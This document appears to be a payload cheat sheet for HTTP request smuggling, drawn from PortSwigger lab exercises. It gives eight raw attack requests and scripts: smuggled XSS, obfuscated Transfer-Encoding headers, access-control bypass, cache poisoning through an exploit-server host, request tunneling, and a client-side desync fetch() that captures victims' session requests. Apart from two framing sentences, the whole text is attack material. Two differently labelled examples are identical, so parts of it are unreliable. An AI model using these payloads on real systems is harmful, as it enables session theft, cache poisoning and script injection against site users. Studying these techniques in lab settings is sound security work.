### Exploiting HTTP Request Manipulations

**DOM XSS via HTTP Request Smuggling**

HTTP Request Smuggling is a technique where a malicious payload can be inserted into the HTTP request to exploit potential vulnerabilities. Here are various examples and techniques related to this attack:

**Example 1 - Basic Request Smuggling:**

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

**Example 2 - Obfuscating TE Header:**

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

**Example 3 - Exploiting to Bypass Access Controls:**

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

**Example 4 - Via CRLF:**

```http
0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x
```

**Example 5 - Cache Poisoning:**

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

**Example 6 - Cache Deception:**

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

**Example 7 - Via Request Tunneling:**

```http
/?cachebuster=3 HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net\r\n
\r\n
GET /resources?<script>alert(1)</script> HTTP/1.1\r\n
Foo: bar
```

**Example 8 - Client-Side Desynchronization:**

```javascript
fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: YOUR-LAB-ID.h1-web-security-academy.net\r\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\r\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

HTTP Request Smuggling techniques can have a significant impact on security. Proper request handling and security measures are essential to prevent these types of vulnerabilities.
